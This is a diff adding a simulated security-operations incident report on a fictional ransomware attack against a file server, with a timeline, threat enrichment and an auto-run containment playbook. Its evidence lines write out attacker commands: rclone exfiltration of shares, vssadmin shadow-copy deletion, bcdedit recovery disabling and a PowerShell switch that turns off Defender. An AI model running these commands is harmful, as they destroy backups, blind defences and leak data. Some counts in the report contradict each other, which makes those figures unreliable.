@@ -1,0 +1,140 @@
+[SEC-OPS INCIDENT REPORT] - INC-2026-1028-003 / Ransomware behaviour on SRV-FILE-02: shadow copies deleted and mass file encryption
+Severity Assessment: Critical | Confidence Score: 97%
+(risk score 100/100 | source: EDR + Firewall | events: 11 | generated 2026-10-28T03:41:17Z)
+
+1. Executive Summary & Root Cause
+Between 2026-10-28T01:58:20Z and 2026-10-28T02:36:10Z, hosts SRV-FILE-02, SRV-RDP-01 and account CORP\rkulkarni produced 8 detections spanning 6 ATT&CK tactics (Initial Access, Execution, Defense Evasion, Lateral Movement, Exfiltration, Impact). Root cause: an internet-exposed Remote Desktop service on SRV-RDP-01 accepted a login from 198.51.100.23 (first seen 2026-10-28T01:58:20Z, T1133, T1021.001). Assessed Critical (risk 100/100) because of ransomware impact stage reached, data exfiltration, lateral movement; the SOAR playbook runs 12 steps automatically.
+
+2. Threat Intelligence & Entity Enrichment
+Entity 1 (File Hash): c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3
+    [MALICIOUS | score 95] VirusTotal (simulated): 64/72 engines flag this hash | Family: LockerSim ransomware (fictional family) (ransomware) | First seen 2026-09-21 | MISP: SIM-EVT-2026-0733 | cluster: SimActor-9 (fictional)
+Entity 2 (IP Address): 198.51.100.77
+    [MALICIOUS | score 90] Reputation (simulated): malicious (score 90/100) | Geo: NL | AS64497 BulletproofSim BV (fictional) | Role: exfil | MISP: SIM-EVT-2026-0733 | cluster: SimActor-9 (fictional) | Seen in 96 events across feeds
+Entity 3 (Domain): files-share-drop.example
+    [MALICIOUS | score 85] Domain reputation (simulated): malicious (score 85/100) | Role: exfil | Registered: 2026-09-30 | Resolves to 198.51.100.77 | MISP: SIM-EVT-2026-0733 | cluster: SimActor-9 (fictional)
+Entity 4 (IP Address): 198.51.100.23
+    [SUSPICIOUS | score 68] Reputation (simulated): suspicious (score 68/100) | Geo: CN | AS64499 ScanFarm Co (fictional) | Role: scanner | MISP: SIM-EVT-2026-0501 | opportunistic scanning cluster | Seen in 780 events across feeds
+Entity 5 (Host (CMDB)): SRV-FILE-02
+    [INFO | score 10] CMDB (simulated): file_server, Windows Server 2019, criticality HIGH
+Entity 6 (Host (CMDB)): SRV-RDP-01
+    [INFO | score 10] CMDB (simulated): server, Windows Server 2022, criticality HIGH
+Entity 7 (User Account (AD/IdP)): CORP\rkulkarni
+    [INFO | score 5] AD/IdP (simulated): R. Kulkarni, IT Support | usual sign-in countries: IN | no risk flags
+
+3. Reconstructed Incident Timeline
+`[2026-10-28T01:58:20Z]` -> Successful logon (RDP) for CORP\rkulkarni on SRV-RDP-01 from 198.51.100.23 -> Initial Access / T1133 External Remote Services; Lateral Movement / T1021.001 Remote Services: Remote Desktop Protocol
+`[2026-10-28T02:14:05Z]` -> psexesvc.exe started rclone.exe on SRV-FILE-02 as CORP\rkulkarni: rclone.exe copy D:\Shares remote:corp-data --transfers 16 --quiet -> Exfiltration / T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage
+`[2026-10-28T02:15:00Z]` -> SRV-FILE-02 (rclone.exe) connected to 198.51.100.77:443, 1.2 GB sent -> Exfiltration / T1041 Exfiltration Over C2 Channel
+`[2026-10-28T02:24:00Z]` -> SRV-FILE-02 (rclone.exe) connected to 198.51.100.77:443, 1.2 GB sent -> Exfiltration / T1041 Exfiltration Over C2 Channel
+`[2026-10-28T02:31:05Z]` -> psexesvc.exe started vssadmin.exe on SRV-FILE-02 as CORP\rkulkarni: vssadmin.exe delete shadows /all /quiet -> Impact / T1490 Inhibit System Recovery
+`[2026-10-28T02:31:09Z]` -> psexesvc.exe started bcdedit.exe on SRV-FILE-02 as CORP\rkulkarni: bcdedit.exe /set {default} recoveryenabled no -> Impact / T1490 Inhibit System Recovery
+`[2026-10-28T02:31:15Z]` -> psexesvc.exe started powershell.exe on SRV-FILE-02 as CORP\rkulkarni: powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true -> Defense Evasion / T1562.001 Impair Defenses: Disable or Modify Tools
+`[2026-10-28T02:32:00Z]` -> psexesvc.exe started locker.exe on SRV-FILE-02 as CORP\rkulkarni: locker.exe --path D:\Shares --silent -> Execution / T1204.002 User Execution: Malicious File
+`[2026-10-28T02:32:40Z]` -> SRV-FILE-02: 1850 files modified/renamed with extension .locked (02:32:40 to 02:36:10) -> Impact / T1486 Data Encrypted for Impact
+
+ATT&CK tactics observed (kill-chain order): Initial Access > Execution > Defense Evasion > Lateral Movement > Exfiltration > Impact
+Detections triggered:
+  - [high] Remote Desktop logon from an external IP address (AUTH-RDP-EXTERNAL)
+      evidence: CORP\rkulkarni -> SRV-RDP-01 via RDP from 198.51.100.23
+  - [high] Data transfer tool commonly used for exfiltration (EXFIL-TOOL)
+      evidence: SRV-FILE-02: C:\ProgramData\rclone.exe rclone.exe copy D:\Shares remote:corp-data --transfers 16 --quiet
+  - [critical] Large outbound transfer to an external host (NET-EXFIL-VOLUME)
+      evidence: SRV-FILE-02 sent 2.4 GB to 198.51.100.77 (known-malicious)
+  - [high] Connection to known exfiltration infrastructure (NET-EXFIL-INFRA)
+      evidence: SRV-FILE-02 -> 198.51.100.77:443 (exfil)
+      evidence: SRV-FILE-02 -> files-share-drop.example:443 (exfil)
+  - [critical] Backups / shadow copies / recovery disabled (ransomware precursor) (IMPACT-INHIBIT-RECOVERY)
+      evidence: SRV-FILE-02: C:\Windows\System32\vssadmin.exe vssadmin.exe delete shadows /all /quiet
+      evidence: SRV-FILE-02: C:\Windows\System32\bcdedit.exe bcdedit.exe /set {default} recoveryenabled no
+  - [high] Security tooling / firewall disabled or excluded (EVADE-DISABLE-DEFENSES)
+      evidence: SRV-FILE-02: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
+  - [critical] Known-malicious file hash observed: LockerSim ransomware (fictional family) (TI-HASH-MALICIOUS)
+      evidence: SRV-FILE-02: C:\ProgramData\locker.exe (LockerSim ransomware (fictional family)) 64/72 engines
+  - [critical] Mass file encryption / ransom note (ransomware impact) (IMPACT-ENCRYPT)
+      evidence: SRV-FILE-02: 1850 files modified/renamed with extension .locked
+      evidence: SRV-FILE-02: 5230 files modified/renamed with extension .locked
+
+4. Autonomous SOAR Isolation Playbook
+Mode: SIMULATION | 12 step(s) | 12 auto-executed | 0 held for human approval by safety guardrails
+Step 1: Network Containment -> Isolate host SRV-FILE-02 from the network (agent stays connected for triage) [CrowdStrike Falcon]
+        API: GET https://api.crowdstrike.com/devices/queries/devices/v1?filter=hostname:'SRV-FILE-02'
+        API: POST https://api.crowdstrike.com/devices/entities/devices-actions/v2?action_name=contain
+             payload: {"ids":["<device_id of SRV-FILE-02>"]}
+        Rollback: POST same endpoint with action_name=lift_containment
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 2: Network Containment -> Isolate host SRV-RDP-01 from the network (agent stays connected for triage) [CrowdStrike Falcon]
+        API: GET https://api.crowdstrike.com/devices/queries/devices/v1?filter=hostname:'SRV-RDP-01'
+        API: POST https://api.crowdstrike.com/devices/entities/devices-actions/v2?action_name=contain
+             payload: {"ids":["<device_id of SRV-RDP-01>"]}
+        Rollback: POST same endpoint with action_name=lift_containment
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 3: Identity Revocation -> Revoke all sign-in sessions and force a password reset for CORP\rkulkarni [Microsoft Entra ID]
+        API: POST https://graph.microsoft.com/v1.0/users/<UPN of CORP\rkulkarni>/revokeSignInSessions
+        API: PATCH https://graph.microsoft.com/v1.0/users/<UPN of CORP\rkulkarni>
+             payload: {"passwordProfile":{"forceChangePasswordNextSignIn":true}}
+        Rollback: n/a (user must re-authenticate; password reset is permanent)
+        Note: Require MFA re-registration.
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 4: Perimeter Block -> Block 2 malicious IP address(es) at the firewall: 198.51.100.23, 198.51.100.77 [Palo Alto PAN-OS]
+        API: POST https://<PAN_FW>/restapi/v10.2/Objects/Addresses?location=vsys&vsys=vsys1&name=SOAR-BLOCK-198.51.100.23
+             payload: {"entry":{"@name":"SOAR-BLOCK-198.51.100.23","ip-netmask":"198.51.100.23/32","description":"SOAR INC-2026-1028-003"}}
+        API: POST https://<PAN_FW>/restapi/v10.2/Objects/Addresses?location=vsys&vsys=vsys1&name=SOAR-BLOCK-198.51.100.77
+             payload: {"entry":{"@name":"SOAR-BLOCK-198.51.100.77","ip-netmask":"198.51.100.77/32","description":"SOAR INC-2026-1028-003"}}
+        API: PUT https://<PAN_FW>/restapi/v10.2/Objects/AddressGroups?location=vsys&vsys=vsys1&name=SOAR-Blocklist
+             payload: {"entry":{"@name":"SOAR-Blocklist","static":{"member":["SOAR-BLOCK-198.51.100.23","SOAR-BLOCK-198.51.100.77"]}}}
+        API: POST https://<PAN_FW>/api/?type=commit&cmd=<commit></commit>
+        Rollback: Remove the address objects from group SOAR-Blocklist and commit
+        Note: Private/internal addresses and the allow-list in config.json are never blocked.
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 5: Perimeter Block -> Block / sinkhole 1 malicious domain(s): files-share-drop.example [Palo Alto PAN-OS + DNS]
+        API: PUT https://<PAN_FW>/restapi/v10.2/Objects/CustomURLCategories?location=vsys&vsys=vsys1&name=SOAR-Block-URLs
+             payload: {"entry":{"@name":"SOAR-Block-URLs","type":"URL List","list":{"member":["files-share-drop.example"]}}}
+        API: POST https://<PAN_FW>/api/?type=commit&cmd=<commit></commit>
+        Rollback: Remove the domains from custom URL category SOAR-Block-URLs and commit
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 6: Endpoint Eradication -> Add 1 malicious file hash(es) to the EDR block list (prevent + remediate) [CrowdStrike Falcon]
+        API: POST https://api.crowdstrike.com/iocs/entities/indicators/v1
+             payload: {"comment":"SOAR INC-2026-1028-003","indicators":[{"type":"sha256","value":"c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3","action":"prevent","severity":"high","platforms":["windows"],"applied_globa...
+        Rollback: DELETE https://api.crowdstrike.com/iocs/entities/indicators/v1?ids=<indicator ids>
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 7: Endpoint Eradication -> Terminate process tree and quarantine image: bcdedit.exe, locker.exe, powershell.exe, rclone.exe, vssadmin.exe on SRV-FILE-02 [CrowdStrike Falcon]
+        API: POST https://api.crowdstrike.com/real-time-response/combined/batch-active-responder-command/v1
+             payload: {"base_command":"kill","command_string":"kill <PID resolved from process tree: bcdedit.exe, locker.exe, powershell.exe, rclone.exe, vssadmin.exe>","host_ids":["<device_id of SRV-FILE-02>"]}
+        API: POST https://api.crowdstrike.com/real-time-response/combined/batch-active-responder-command/v1
+             payload: {"base_command":"rm","command_string":"rm <image path of bcdedit.exe, locker.exe, powershell.exe, rclone.exe, vssadmin.exe> (after copy to quarantine)","host_ids":["<device_id of SRV-FILE-02>"]}
+        Rollback: n/a (process termination is not reversible; restore file from quarantine copy)
+        Note: Resolve the PID from the EDR process tree; never kill by image name alone.
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 8: Forensic Preservation -> Collect a triage package (processes, network, autoruns, prefetch) from SRV-FILE-02 [CrowdStrike Falcon]
+        API: POST https://api.crowdstrike.com/real-time-response/entities/sessions/v1
+             payload: {"device_id":"<device_id of SRV-FILE-02>","queue_offline":false}
+        API: POST https://api.crowdstrike.com/real-time-response/entities/active-responder-command/v1
+             payload: {"base_command":"runscript","command_string":"runscript -CloudFile=\"triage_collector\"","session_id":"<session id>"}
+        Rollback: n/a
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 9: Forensic Preservation -> Collect a triage package (processes, network, autoruns, prefetch) from SRV-RDP-01 [CrowdStrike Falcon]
+        API: POST https://api.crowdstrike.com/real-time-response/entities/sessions/v1
+             payload: {"device_id":"<device_id of SRV-RDP-01>","queue_offline":false}
+        API: POST https://api.crowdstrike.com/real-time-response/entities/active-responder-command/v1
+             payload: {"base_command":"runscript","command_string":"runscript -CloudFile=\"triage_collector\"","session_id":"<session id>"}
+        Rollback: n/a
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 10: Scoping & Hunt -> Hunt for the same indicators on other hosts [Microsoft Sentinel + Splunk]
+        API: KQL DeviceFileEvents | where SHA256 in ("c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3") | summarize hosts=dcount(DeviceName) by DeviceName
+        API: KQL DeviceNetworkEvents | where RemoteIP in ("198.51.100.23", "198.51.100.77") or RemoteUrl in ("files-share-drop.example") | summarize count() by DeviceName
+        API: SPL index=* (dest_ip IN (198.51.100.23, 198.51.100.77) OR dest IN (files-share-drop.example)) | stats count by host, dest
+        Rollback: read-only queries
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 11: Ticketing -> Open a P1 incident ticket with the full report attached [ServiceNow]
+        API: POST https://<instance>.service-now.com/api/now/table/incident
+             payload: {"short_description":"[SecOps CRITICAL] Ransomware behaviour on SRV-FILE-02: shadow copies deleted and mass file encryption","category":"Security","urgency":1,"impact":1,"description":"Alert INC-2026-1028-003 (Ransomw...
+        Rollback: close ticket
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 12: Notification -> Page the on-call analyst [Slack]
+        API: POST https://slack.com/api/chat.postMessage
+             payload: {"channel":"#soc-incidents","text":"[SecOps CRITICAL] Ransomware behaviour on SRV-FILE-02: shadow copies deleted and mass file encryption: 10 steps auto-run, 0 awaiting approval"}
+        Rollback: n/a
+        Status: SIMULATED EXECUTED (no network call was sent)
+
+---
+SIMULATION: threat intelligence, directory data and SOAR actions are simulated. No API call was sent and nothing was isolated, disabled or blocked.
